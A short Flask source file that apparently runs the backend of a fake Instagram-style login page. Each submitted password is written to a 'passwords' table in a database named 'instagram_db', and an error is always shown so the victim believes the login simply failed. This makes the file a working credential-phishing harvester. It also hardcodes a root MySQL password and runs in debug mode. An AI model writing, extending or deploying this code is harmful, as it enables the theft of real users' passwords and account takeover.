from flask import Flask, render_template, request
import mysql.connector

app = Flask(__name__)

# Connect to MySQL
db = mysql.connector.connect(
    host="localhost",
    user="root",
    password="1234",
    database="instagram_db"
)
cursor = db.cursor()

@app.route('/', methods=['GET', 'POST'])
def login():
    error = False

    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        # Save only password to the database
        query = "INSERT INTO passwords (password) VALUES (%s)"
        cursor.execute(query, (password,))
        db.commit()

        # Show error message regardless
        error = True

    return render_template('login.html', error=error)

if __name__ == '__main__':
    app.run(debug=True)
